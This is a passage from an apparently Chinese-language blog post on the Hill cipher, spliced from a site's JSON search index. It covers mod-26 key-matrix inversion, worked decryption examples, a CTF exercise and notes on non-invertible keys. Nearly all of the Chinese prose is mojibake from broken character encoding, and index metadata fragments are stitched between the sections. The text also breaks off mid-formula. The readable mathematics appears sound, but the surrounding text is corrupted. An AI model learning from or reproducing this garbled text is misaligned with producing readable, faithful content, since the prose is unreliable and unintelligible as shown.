ä»ä¸Šé¢çš„ä¸¤ä¸ªå…¬å¼æ¥çœ‹ï¼Œä¸¤ä¸ªéƒ½æ˜¯ç”¨çŸ©é˜µè¡Œåˆ—å¼çš„å€’æ•°å»ä¹˜ä»¥çŸ©é˜µçš„ä¼´éšçŸ©é˜µï¼Œä»è€Œå¾—åˆ°çŸ©é˜µçš„é€†ã€‚çœ‹ä¸Šå»ä¼¼ä¹ä¸¤ä¸ªæ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œå®é™…ä¸Šï¼Œå¸Œå°”å¯†ç çš„çŸ©é˜µæ±‚é€†ï¼Œè¿˜éœ€è¦ä¸æ›¿æ¢è¡¨çš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯ 26ï¼Œè¿›è¡Œç›¸å…³çš„æ¨¡è¿ç®—ï¼Œè¿™å°±æ˜¯ä¸¤è€…çš„åŒºåˆ«ï¼Œä¸‹é¢ä¼šè¯¦ç»†è®²è§£å¸Œå°”å¯†ç çŸ©é˜µçš„æ±‚é€†æ­¥éª¤ã€‚ è¿™é‡Œæœ‰ä¸ªå¾ˆå¤§çš„è¯¯åŒºï¼Œç½‘ä¸Šæ‰¾äº†å¾ˆå¤šç¯‡å¸–å­ï¼Œå‘ç°å¤§å®¶æ±‚çš„éƒ½æ˜¯ä¸€èˆ¬çš„é€†çŸ©é˜µï¼ŒåŒ…æ‹¬å„ç§CTFé¢˜ä¹Ÿæ˜¯æŒ‰ç…§ä¸€èˆ¬çš„é€†çŸ©é˜µæ¥åŠ å¯†æˆ–è§£å¯†ï¼Œä¸çŸ¥é“æ˜¯å‡ºé¢˜äººå¯¹å¸Œå°”å¯†ç ç†è§£æœ‰è¯¯ï¼Œè¿˜æ˜¯è¯´å¸Œå°”å¯†ç æœ‰å¦ä¸€ç§è®¡ç®—æ–¹å¼ï¼Œåæ­£çœ‹åˆ°çš„ CTF é¢˜ï¼Œéƒ½ä¸æ˜¯ç»´åŸºç™¾ç§‘çš„é‚£ç§è®¡ç®—æ–¹å¼ã€‚ ç½‘ä¸Šæœåˆ°çš„å…³äºå¸Œå°”å¯†ç çš„èµ„æ–™ï¼Œä¹Ÿçš„ç¡®å†™çš„æ˜¯é€†çŸ©é˜µè¿™ä¸‰ä¸ªå­—ï¼Œå¯¼è‡´å¾ˆå®¹æ˜“å°±ç†è§£ä¸ºä¸€èˆ¬çš„é€†çŸ©é˜µï¼Œä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰é‡æ–°å–ä¸€ä¸ªåå­—ï¼Œè¿™é‡Œå›°æƒ‘äº†å¥½ä¹…ã€‚ ä¸Šé¢è®²äº†ä¸€å¤§å †ç†è®ºçŸ¥è¯†ï¼Œç°åœ¨å¼€å§‹æ¥è¿›è¡Œå¯†é’¥çŸ©é˜µæ±‚é€†çš„æ­¥éª¤ã€‚ Step 1 é¦–å…ˆï¼Œéœ€è¦æ±‚å–å¯†é’¥çŸ©é˜µè¡Œåˆ—å¼çš„ä¹˜æ³•é€†ã€‚ 2 x 2çŸ©é˜µçš„è¡Œåˆ—å¼è®¡ç®—æ–¹å¼å¦‚ä¸‹ï¼š \\[ \\begin{vmatrix} a \u0026 b \\\\ c \u0026 d \\end{vmatrix} = a \\times d - b \\times c \\] å¸¦å…¥å¯†é’¥çŸ©é˜µï¼Œç»“æœå¦‚ä¸‹ï¼š \\[ \\begin{vmatrix} h \u0026 i \\\\ l \u0026 l \\end{vmatrix} = \\begin{vmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{vmatrix} = 7 \\times 11 - 8 \\times 11= -11 \\] å°†è¡Œåˆ—å¼çš„ç»“æœæ¨¡ 26ï¼š \\[ -11 \\equiv 15 \\mod {26} \\] å†æ±‚å–å…¶çš„ä¹˜æ³•é€†ï¼Œä¹˜æ³•é€†æ±‚å–æ–¹å¼å¦‚ä¸‹ï¼š \\[ d \\times d^{-1} \\equiv 1 \\mod 26 \\] å¸¦å…¥ç›¸åº”çš„æ•°å­—ï¼Œå¦‚ä¸‹ï¼š \\[ 15 \\times x \\equiv 1 \\mod 26 \\] æ±‚ä¹˜æ³•é€†å¯ä»¥é€šè¿‡æšä¸¾çš„æ–¹å¼ï¼Œä¸‹é¢æ˜¯Pythonä»£ç ï¼š i = 0 while True: if 15 * i % 26 == 1: print(i) exit() i += 1 æœ€åå¾—åˆ°ç»“æœä¸º7ï¼Œå¦‚ä¸‹ï¼š \\[ 15 \\times 7 \\equiv 105 \\equiv 1 \\mod 26 \\] Step 2 æ¥ç€æ±‚å–å¯†é’¥çŸ©é˜µçš„ä¼´éšçŸ©é˜µã€‚ 2 x 2çŸ©é˜µçš„ä¼´éšçŸ©é˜µå¦‚ä¸‹è®¡ç®—ï¼š \\[ adj \\begin{pmatrix} a \u0026 b \\\\ c \u0026 d \\end{pmatrix} = \\begin{pmatrix} d \u0026 -b \\\\ -c \u0026 a \\end{pmatrix} \\] å¸¦å…¥å¯†é’¥çŸ©é˜µçš„è¯ï¼Œç»“æœå¦‚ä¸‹ï¼š \\[ adj \\begin{pmatrix} h \u0026 i \\\\ l \u0026 l \\end{pmatrix} = adj \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} = \\begin{pmatrix} 11 \u0026 -8 \\\\ -11 \u0026 7 \\end{pmatrix} \\] å¾—åˆ°ç»“æœä¹‹åï¼Œéœ€è¦åœ¨è´Ÿå€¼ä¸ŠåŠ ä¸Š 26ï¼Œä»¥å¾—åˆ° 0 ~ 25 ä¹‹é—´çš„æ•°å­—ï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} 11 \u0026 -8 \\\\ -11 \u0026 7 \\end{pmatrix} = \\begin{pmatrix} 11 \u0026 -8 + 26 \\\\ -11 + 26 \u0026 7 \\end{pmatrix} \\] æœ€åå¾—åˆ°ç»“æœï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} 11 \u0026 18 \\\\ 15 \u0026 7 \\end{pmatrix} \\] Step 3 æœ€åæ¥æ±‚å¯†é’¥çŸ©é˜µçš„é€†ã€‚ å¾—åˆ°è¡Œåˆ—å¼çš„ä¹˜æ³•é€†å’Œä¼´éšçŸ©é˜µä¹‹åï¼Œå°†ä¸¤è€…ç›¸ä¹˜çš„ç»“æœï¼Œå†æ¨¡ä¸Š 26ï¼Œå°±å¾—åˆ°äº†é€†çŸ©é˜µï¼Œå¦‚ä¸‹ï¼š \\[ 7 \\times \\begin{pmatrix} 11 \u0026 18 \\\\ 15 \u0026 7 \\end{pmatrix} \\equiv \\begin{pmatrix} 7 \\times 11 \u0026 7 \\times 18 \\\\ 7 \\times 15 \u0026 7 \\times 7 \\end{pmatrix} \\equiv \\begin{pmatrix} 77 \u0026 126 \\\\ 105 \u0026 49 \\end{pmatrix} \\equiv \\begin{pmatrix} 25 \u0026 22 \\\\ 1 \u0026 23 \\end{pmatrix} \\mod 26 \\] ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:3:3","tags":["å¯†ç å­¦"],"title":"å…³äºå¸Œå°”å¯†ç çš„ç®€å•ç ”ç©¶","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"è§£å¯† å¾—åˆ°äº†é€†çŸ©é˜µä¹‹åï¼Œä¸åŠ å¯†æ­¥éª¤ä¸€æ ·ï¼Œç”¨é€†çŸ©é˜µä¹˜ä»¥å¯†æ–‡çŸ©é˜µçš„æ¯ä¸€é¡¹åˆ—å‘é‡ï¼Œå†ä¸ 26 ç›¸æ¨¡ï¼Œå³å¯å¾—åˆ°ç›¸åº”çš„æ˜æ–‡ï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} 25 \u0026 22 \\\\ 1 \u0026 23 \\end{pmatrix} \\begin{pmatrix} 3 \\\\ 17 \\end{pmatrix} \\equiv \\begin{pmatrix} 25 \\times 3 \u0026 + \u0026 22 \\times 17 \\\\ 1 \\times 3 \u0026 + \u0026 23 \\times 17 \\end{pmatrix} \\equiv \\begin{pmatrix} 449 \\\\ 394 \\end{pmatrix} \\equiv \\begin{pmatrix} 7 \\\\ 4 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} h \\\\ e \\end{pmatrix} \\] \\[ \\begin{pmatrix} 25 \u0026 22 \\\\ 1 \u0026 23 \\end{pmatrix} \\begin{pmatrix} 9 \\\\ 8 \\end{pmatrix} \\equiv \\begin{pmatrix} 25 \\times 9 \u0026 + \u0026 22 \\times 8 \\\\ 1 \\times 9 \u0026 + \u0026 23 \\times 8 \\end{pmatrix} \\equiv \\begin{pmatrix} 401 \\\\ 193 \\end{pmatrix} \\equiv \\begin{pmatrix} 11 \\\\ 11 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} l \\\\ l \\end{pmatrix} \\] \\[ \\begin{pmatrix} 25 \u0026 22 \\\\ 1 \u0026 23 \\end{pmatrix} \\begin{pmatrix} 14 \\\\ 6 \\end{pmatrix} \\equiv \\begin{pmatrix} 25 \\times 14 \u0026 + \u0026 22 \\times 6 \\\\ 1 \\times 14 \u0026 + \u0026 23 \\times 6 \\end{pmatrix} \\equiv \\begin{pmatrix} 482 \\\\ 152 \\end{pmatrix} \\equiv \\begin{pmatrix} 14 \\\\ 22 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} o \\\\ w \\end{pmatrix} \\] \\[ \\begin{pmatrix} 25 \u0026 22 \\\\ 1 \u0026 23 \\end{pmatrix} \\begin{pmatrix} 0 \\\\ 3 \\end{pmatrix} \\equiv \\begin{pmatrix} 25 \\times 0 \u0026 + \u0026 22 \\times 3 \\\\ 1 \\times 0 \u0026 + \u0026 23 \\times 3 \\end{pmatrix} \\equiv \\begin{pmatrix} 66 \\\\ 69 \\end{pmatrix} \\equiv \\begin{pmatrix} 14 \\\\ 17 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} o \\\\ r \\end{pmatrix} \\] \\[ \\begin{pmatrix} 25 \u0026 22 \\\\ 1 \u0026 23 \\end{pmatrix} \\begin{pmatrix} 23 \\\\ 24 \\end{pmatrix} \\equiv \\begin{pmatrix} 25 \\times 23 \u0026 + \u0026 22 \\times 24 \\\\ 1 \\times 23 \u0026 + \u0026 23 \\times 24 \\end{pmatrix} \\equiv \\begin{pmatrix} 1103 \\\\ 575 \\end{pmatrix} \\equiv \\begin{pmatrix} 11 \\\\ 3 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} l \\\\ d \\end{pmatrix} \\] æœ€åï¼Œå¯†æ–‡ä¸ºdrjiogadxyï¼Œå¯†é’¥ä¸ºhillçš„æƒ…å†µä¸‹ï¼Œå¸Œå°”å¯†ç è§£å¯†åå¾—åˆ°çš„æ˜æ–‡ä¸ºhelloworldã€‚ ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:3:4","tags":["å¯†ç å­¦"],"title":"å…³äºå¸Œå°”å¯†ç çš„ç®€å•ç ”ç©¶","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"4. CTF å®æˆ˜ è¿™æ˜¯XMané€‰æ‹”èµ›çš„ä¸€é“é¢˜ï¼Œå¾ˆç®€å•ï¼Œé¢˜ç›®å°±ä¸€ä¸ªTXTæ–‡æœ¬ï¼Œæ‰“å¼€ä¸€çœ‹ï¼Œé‡Œé¢æœ‰ä¸€ä¸²å­—ç¬¦ä¸²å’Œä¸€ä¸ªçŸ©é˜µï¼Œå¦‚ä¸‹ï¼š \" ä¸€çœ‹å°±çŸ¥é“æ˜¯å…³äºå¸Œå°”å¯†ç çš„é¢˜ï¼Œå­—ç¬¦ä¸²ä¸ºå¯†æ–‡ï¼ŒçŸ©é˜µä¸ºå¯†é’¥ã€‚å…ˆæ±‚å¯†é’¥çŸ©é˜µçš„é€†ï¼š \\[ è¡Œåˆ—å¼ï¼š\\\\ \\begin{vmatrix} 1 \u0026 2 \\\\ 4 \u0026 7 \\end{vmatrix} \\equiv 1 \\times 7 - 2 \\times 4 \\equiv -1 \\equiv 25 \\mod 26 \\] \\[ è¡Œåˆ—å¼çš„ä¹˜æ³•é€†ï¼š\\\\ 25 \\times x \\equiv 1 \\mod 26 \\\\ = \\\\ 25 \\times 25 \\equiv 1 \\mod 26 \\] \\[ ä¼´éšçŸ©é˜µï¼š\\\\ adj \\begin{pmatrix} 1 \u0026 2 \\\\ 4 \u0026 7 \\end{pmatrix} = \\begin{pmatrix} 7 \u0026 -2 \\\\ -4 \u0026 1 \\end{pmatrix} = \\begin{pmatrix} 7 \u0026 -2 + 26 \\\\ -4 + 26 \u0026 1 \\end{pmatrix} = \\begin{pmatrix} 7 \u0026 24 \\\\ 22 \u0026 1 \\end{pmatrix} \\] \\[ é€†çŸ©é˜µï¼š\\\\ 25 \\times \\begin{pmatrix} 7 \u0026 24 \\\\ 22 \u0026 1 \\end{pmatrix} \\equiv \\begin{pmatrix} 25 \\times 7 \u0026 25 \\times 24 \\\\ 25 \\times 22 \u0026 25 \\times 1 \\end{pmatrix} \\equiv \\begin{pmatrix} 175 \u0026 600 \\\\ 550 \u0026 25 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\mod 26 \\] æ±‚å¾—é€†çŸ©é˜µä¹‹åï¼Œå†æŠŠå¯†æ–‡è½¬æ¢ä¸ºçŸ©é˜µå¹¶åˆ†å‰²æˆåˆ—å‘é‡çš„å½¢å¼ï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} h \u0026 w \u0026 h \u0026 y \u0026 c \u0026 w \u0026 b \u0026 k \u0026 b \\\\ r \u0026 d \u0026 r \u0026 g \u0026 q \u0026 d \u0026 n \u0026 l \u0026 k \\end{pmatrix} = \\begin{pmatrix} 7 \u0026 22 \u0026 7 \u0026 24 \u0026 2 \u0026 22 \u0026 1 \u0026 10 \u0026 1 \\\\ 17 \u0026 3 \u0026 17 \u0026 6 \u0026 16 \u0026 3 \u0026 13 \u0026 11 \u0026 10 \\end{pmatrix} \\\\ = \\\\ \\begin{pmatrix} 7 \\\\ 17 \\end{pmatrix} \\begin{pmatrix} 22 \\\\ 3 \\end{pmatrix} \\begin{pmatrix} 7 \\\\ 17 \\end{pmatrix} \\begin{pmatrix} 24 \\\\ 6 \\end{pmatrix} \\begin{pmatrix} 2 \\\\ 16 \\end{pmatrix} \\begin{pmatrix} 22 \\\\ 3 \\end{pmatrix} \\begin{pmatrix} 1 \\\\ 13 \\end{pmatrix} \\begin{pmatrix} 10 \\\\ 11 \\end{pmatrix} \\begin{pmatrix} 1 \\\\ 10 \\end{pmatrix} \\] å¼€å§‹è§£å¯†ï¼Œç”¨é€†çŸ©é˜µä¹˜ä»¥å¯†æ–‡çŸ©é˜µçš„æ¯ä¸€ä¸ªåˆ—å‘é‡å¹¶ä¸ 26 ç›¸æ¨¡ï¼Œå¾—åˆ°æ˜æ–‡ï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\begin{pmatrix} 7 \\\\ 17 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\times 7 \u0026 + \u0026 2 \\times 17 \\\\ 4 \\times 7 \u0026 + \u0026 25 \\times 17 \\end{pmatrix} \\equiv \\begin{pmatrix} 167 \\\\ 453 \\end{pmatrix} \\equiv \\begin{pmatrix} 11 \\\\ 11 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} l \\\\ l \\end{pmatrix} \\] \\[ \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\begin{pmatrix} 22 \\\\ 3 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\times 22 \u0026 + \u0026 2 \\times 3 \\\\ 4 \\times 22 \u0026 + \u0026 25 \\times 3 \\end{pmatrix} \\equiv \\begin{pmatrix} 424 \\\\ 163 \\end{pmatrix} \\equiv \\begin{pmatrix} 8 \\\\ 7 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} i \\\\ h \\end{pmatrix} \\] \\[ \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\begin{pmatrix} 7 \\\\ 17 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\times 7 \u0026 + \u0026 2 \\times 17 \\\\ 4 \\times 7 \u0026 + \u0026 25 \\times 17 \\end{pmatrix} \\equiv \\begin{pmatrix} 167 \\\\ 453 \\end{pmatrix} \\equiv \\begin{pmatrix} 11 \\\\ 11 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} l \\\\ l \\end{pmatrix} \\] \\[ \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\begin{pmatrix} 24 \\\\ 6 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\times 24 \u0026 + \u0026 2 \\times 6 \\\\ 4 \\times 24 \u0026 + \u0026 25 \\times 6 \\end{pmatrix} \\equiv \\begin{pmatrix} 468 \\\\ 246 \\end{pmatrix} \\equiv \\begin{pmatrix} 0 \\\\ 12 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} a \\\\ m \\end{pmatrix} \\] \\[ \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\begin{pmatrix} 2 \\\\ 16 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\times 2 \u0026 + \u0026 2 \\times 16 \\\\ 4 \\times 2 \u0026 + \u0026 25 \\times 16 \\end{pmatrix} \\equiv \\begin{pmatrix} 70 \\\\ 408 \\end{pmatrix} \\equiv \\begin{pmatrix} 18 \\\\ 18 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} s \\\\ s \\end{pmatrix} \\] \\[ \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\begin{pmatrix} 22 \\\\ 3 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\times 22 \u0026 + \u0026 2 \\times 3 \\\\ 4 \\times 22 \u0026 + \u0026 25 \\times 3 \\end{pmatrix} \\equiv \\begin{pmatrix} 424 \\\\ 163 \\end{pmatrix} \\equiv \\begin{pmatrix} 8 \\\\ 7 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} i \\\\ h \\end{pmatrix} \\] \\[ \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\begin{pmatrix} 1 \\\\ 13 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\times 1 \u0026 + \u0026 2 \\times 13 \\\\ 4 \\times 1 \u0026 + \u0026 25 \\times 13 \\end{pmatrix} \\equiv \\begin{pmatrix} 45 \\\\ 329 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\\\ 17 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} t \\\\ r \\end{pmatrix} \\] \\[ \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\begin{pmatrix} 10 \\\\ 11 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\times 10 \u0026 + \u0026 2 \\times 11 \\\\ 4 \\times 10 \u0026 + \u0026 25 \\times 11 \\end{pmatrix} \\equiv \\begin{pmatrix} 212 \\\\ 315 \\end{pm","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:4:0","tags":["å¯†ç å­¦"],"title":"å…³äºå¸Œå°”å¯†ç çš„ç®€å•ç ”ç©¶","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"5. å…¶ä»–é—®é¢˜ å¯†é’¥éœ€è®¾ç½®ä¸ºå¯é€†çš„ çŸ©é˜µæœ‰ä¸å¯é€†çŸ©é˜µã€‚ä½œä¸ºå¯†é’¥çŸ©é˜µï¼Œå¦‚æœä¸å¯é€†çš„è¯ï¼Œé‚£ä¹ˆå°†æ— æ³•è¿›è¡Œè§£å¯†ã€‚æ‰€ä»¥åœ¨å®šä¹‰å¯†é’¥ä¹‹å‰ï¼Œéœ€è¦åˆ¤æ–­è¯¥å¯†é’¥æ˜¯å¦å¯é€†ï¼Œä¸€èˆ¬çš„æ–¹æ³•æ˜¯åˆ©ç”¨å¯†é’¥çŸ©é˜µçš„è¡Œåˆ—å¼ï¼Œå½“è¡Œåˆ—å¼ä¸ä¸º 0ï¼Œå¹¶ä¸”ä¸æ›¿æ¢è¡¨é•¿åº¦äº’è´¨çš„æƒ…å†µä¸‹ï¼Œè¯¥å¯†é’¥æ‰å¯ç”¨æ¥è§£å¯†ã€‚æ‹¿ä¸Šé¢çš„hillä¸¾ä¾‹ï¼Œå¦‚ä¸‹ï¼š \\[ \\begin{vmatrix} h \u0026 i \\\\ l \u0026 l \\end{vmatrix} \\equiv \\begin{vmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{vmatrix} \\equiv 7 \\times 11 - 8 \\times 11 \\equiv -11 \\equiv 15 \\mod 26 \\] æ±‚å¾—çš„ç»“æœä¸º 15ï¼Œ15 æ»¡è¶³ä¸ä¸º 0 çš„è¦æ±‚ï¼Œå¹¶ä¸”ä¹Ÿä¸ 26 äº’è´¨ï¼Œæ‰€ä»¥è¯¥å¯†é’¥å¯ä»¥ç”¨æ¥è§£å¯†ã€‚ å¦‚æœè®¾ç½®å¯†é’¥ä¸ºä¸å¯é€†çš„å¯†é’¥ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µå‘¢ï¼Ÿä¾‹å¦‚è®¾ç½®å¯†é’¥ä¸ºfcdjï¼Œè½¬æ¢ä¸ºçŸ©é˜µä¸ºï¼š \\[ \\begin{pmatrix} 5 \u0026 2 \\\\ 3 \u0026 9 \\end{pmatrix} \\] å®ƒçš„è¡Œåˆ—å¼å¦‚ä¸‹ï¼š \\[ \\begin{vmatrix} 5 \u0026 2 \\\\ 3 \u0026 9 \\end{vmatrix} \\equiv 5 \\times 9 - 2 \\times 3 \\equiv 39 \\equiv 13 \\mod 26 \\] å¾—åˆ°è¡Œåˆ—å¼ä¸º 13ï¼Œè€Œ 13 ä¸ 26 å¹¶ä¸äº’è´¨ï¼Œå› ä¸ºä»–ä»¬å­˜åœ¨ä¸¤ä¸ªå…¬çº¦æ•°ï¼š1ã€13 ç”¨è¯¥çŸ©é˜µæ¥åŠ å¯†æ²¡ä»»ä½•é—®é¢˜ï¼Œé—®é¢˜ä¼šå‡ºç°åœ¨è§£å¯†ä¸Šã€‚åœ¨è§£å¯†çš„æ—¶å€™ï¼Œç”¨è¯¥çŸ©é˜µæ±‚é€†çŸ©é˜µæ—¶ï¼Œåœ¨æ±‚è¡Œåˆ—å¼çš„ä¹˜æ³•é€†çš„åœ°æ–¹å°±ä¼šå¡ä½ï¼Œæ˜¯æ‰¾ä¸åˆ°ç›¸åº”çš„ä¹˜æ³•é€†çš„ï¼Œå¦‚æœä¸ç›¸ä¿¡çš„è¯ï¼Œå¯ä»¥ç”¨è„šæœ¬è·‘ä¸€è·‘ã€‚ æ‰¾ä¸åˆ°ä¹˜æ³•é€†ï¼Œä¹Ÿå°±æ‰¾ä¸åˆ°è§£å¯†ç”¨çš„é€†çŸ©é˜µï¼Œä¹Ÿå°±è§£ä¸äº†å¯†ã€‚æ‰€ä»¥åœ¨è®¾ç½®å¯†é’¥çš„æ—¶å€™ï¼Œä¸€å®šè¦å…ˆç”¨ä¸Šé¢çš„å…¬å¼æ¥ç¡®è®¤å¯†é’¥æ˜¯å¦ä¸ºå¯é€†çš„ã€‚ æ›¿æ¢è¡¨ä¸ 26 å…³äºæ›¿æ¢è¡¨ä¸ 26 è¿™ä¸ªæ•°å­—ï¼Œå¾—æä¸€æã€‚ æ›¿æ¢è¡¨ä¸ä¸€å®šå¾—æ˜¯æŒ‰ç…§é¡ºåºæ’åˆ—çš„ 26 ä¸ªå­—æ¯ï¼Œä¹Ÿå¯ä»¥æ‰“ä¹±é¡ºåºæ’åˆ—ï¼Œç”šè‡³å¯ä»¥ä¸ç”¨å­—æ¯ï¼Œç”¨ä¸­æ–‡å½“æ›¿æ¢è¡¨ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œåªæ˜¯ç›¸åº”çš„è®¡ç®—éƒ½å¾—æ ¹æ®æ›¿æ¢è¡¨å‘ç”Ÿå˜åŒ–è€Œå·²ã€‚ä¾‹å¦‚æ›¿æ¢è¡¨æ¢æˆä¸‹é¢è¿™æ ·ï¼Œä¸€æ ·å¯ä»¥è¿›è¡ŒåŠ è§£å¯†ï¼š \\[ \\begin{array}{cc} h \u0026 e \u0026 l \u0026 l \u0026 o \u0026 w \u0026 o \u0026 r \u0026 l \u0026 d \\\\ 0 \u0026 1 \u0026 2 \u0026 3 \u0026 4 \u0026 5 \u0026 6 \u0026 7 \u0026 8 \u0026 9 \\end{array} \\] è€Œ 26 è¿™ä¸ªæ•°å­—ï¼Œåœ¨æ–‡ä¸­ä½¿ç”¨ 26 æ¥ä¸å…¶ä»–è¡¨è¾¾å¼è¿›è¡Œè®¡ç®—ï¼Œæ˜¯å› ä¸ºæ›¿æ¢è¡¨åˆšå¥½æœ‰ 26 ä¸ªå­—ç¬¦ã€‚è¿™ä¸ª 26 æ˜¯æ ¹æ®æ›¿æ¢è¡¨çš„é•¿åº¦æ¥çš„ï¼Œä¾‹å¦‚ä¸Šé¢çš„æ›¿æ¢è¡¨ï¼Œå¦‚æœè¦è¿›è¡Œç›¸åº”çš„è®¡ç®—ï¼Œé‚£åº”è¯¥å°† 26 æ¢æˆ 10 æ‰å¯¹ã€‚ æ˜æ–‡ä¸å¯†é’¥çš„å¡«å……äº‹é¡¹ åœ¨å‰é¢æˆ‘ä»¬æåˆ°äº†å…³äºæ˜æ–‡çš„é•¿åº¦ä¸å¤Ÿå¡«å……çŸ©é˜µå’Œå¯†é’¥çš„é•¿åº¦å¤§äºæˆ–å°äºçŸ©é˜µçš„å¡«å……é•¿åº¦çš„ç›¸å…³é—®é¢˜ï¼Œè¿™ä¸ªé—®é¢˜ç½‘ä¸Šæœç´¢äº†å¾ˆå¤šèµ„æ–™ï¼Œæ²¡æœ‰ç»Ÿä¸€çš„ç­”æ¡ˆã€‚æœ‰çš„è¯´å°† 0 ä½œä¸ºå¡«å……ç‰©ï¼Œæœ‰çš„è¯´å°† E ä½œä¸ºå¡«å……ç‰©ï¼Œè¯´å•¥çš„éƒ½æœ‰ã€‚ åœ¨è¿™é‡Œæˆ‘è§‰å¾—ï¼Œå¡«å……ä»€ä¹ˆéƒ½æ²¡æœ‰å…³ç³»ï¼Œè¿™ä¸ªå¯ä»¥è‡ªå®šä¹‰çš„ï¼Œä½†æ˜¯åŠ è§£å¯†æ—¶å¿…é¡»ä¸€è‡´ï¼Œä¾‹å¦‚åŠ å¯†æ—¶å¡«å……çš„æ˜¯ xï¼Œé‚£ä¹ˆè§£å¯†æ—¶ä¹Ÿåº”è¯¥å¡«å…… xï¼Œæ‰€ä»¥è¿™ä¸ªåœ°æ–¹åªéœ€è¦åŠ è§£å¯†ä¿æŒä¸€è‡´ï¼Œå¡«å……ä»€ä¹ˆå­—ç¬¦éƒ½æ— æ‰€è°“ã€‚ ç½‘ä¸Šçš„å¸Œå°”å¯†ç èµ„æ–™ ç½‘ä¸Šçœ‹äº†å¾ˆå¤šå…³äºå¸Œå°”å¯†ç çš„èµ„æ–™ï¼Œæ°´å¹³å‚å·®ä¸é½ï¼Œç‰¹åˆ«æ˜¯å‰é¢æåˆ°çš„å…³äºè§£å¯†æ—¶çš„é€†çŸ©é˜µè®¡ç®—æ–¹æ³•ï¼Œå„ç§å„æ ·çš„è§£æ³•éƒ½æœ‰ã€‚å›½å†…çš„èµ„æ–™ï¼Œè¯´å®è¯æ°´å¹³çš„ç¡®è¦å·®äº›ï¼Œå¯¹æ¯”ä¸€ä¸‹ä¸­è‹±æ–‡çš„å¸Œå°”å¯†ç çš„ç»´åŸºç™¾ç§‘ï¼Œé‚£ç®€ç›´ä¸€ä¸ªå¤©ä¸Šä¸€ä¸ªåœ°ä¸‹ã€‚æ‰€ä»¥å¦‚æœéœ€è¦æ·±å…¥å­¦ä¹ å¸Œå°”å¯†ç çš„ç›¸å…³çŸ¥è¯†ï¼Œå»ºè®®æœç´¢è‹±æ–‡ç‰ˆçš„èµ„æ–™è¿›è¡Œå­¦ä¹ ã€‚ é€†çŸ©é˜µç›¸å…³é—®é¢˜ å¯¹äºè§£å¯†æ—¶çš„é€†çŸ©é˜µï¼Œç ”ç©¶äº†ä¸€ä¸‹ï¼Œå‘ç°å½“å¯†é’¥çŸ©é˜µçš„ä¸€èˆ¬é€†çŸ©é˜µï¼Œä¹Ÿå°±æ˜¯ç”¨ $ A^{-1} = { \\frac {A^{*}}{|A|} } = { \\frac 1{|A|} } \\times A^{*} $ å…¬å¼æ±‚å‡ºæ¥çš„é€†çŸ©é˜µï¼Œå®ƒçš„æ¯ä¸€ä¸ªå€¼éƒ½ä¸ºæ•´æ•°æ—¶ï¼Œè¯¥å¯†é’¥çŸ©é˜µå°±å¯ä»¥ç”¨ä¸€èˆ¬é€†çŸ©é˜µçš„æ–¹å¼æ¥è§£å¯†å¯†æ–‡ï¼Œæ¯”å¦‚ä¸Šé¢çš„ CTF ä¾‹å­ï¼Œå®ƒçš„ä¸€èˆ¬é€†çŸ©é˜µæ˜¯è¿™æ ·çš„ï¼š \\[ \\begin{pmatrix} 1 \u0026 2 \\\\ 4 \u0026 7 \\end{pmatrix} ^{-1} = \\begin{pmatrix} -7 \u0026 2 \\\\ 4 \u0026 -1 \\end{pmatrix} \\] ç”¨è¿™ä¸ªé€†çŸ©é˜µå¯¹å¯†æ–‡çŸ©é˜µçš„æ¯ä¸€ä¸ªåˆ—å‘é‡è¿›è¡Œç›¸ä¹˜å¹¶å–æ¨¡ 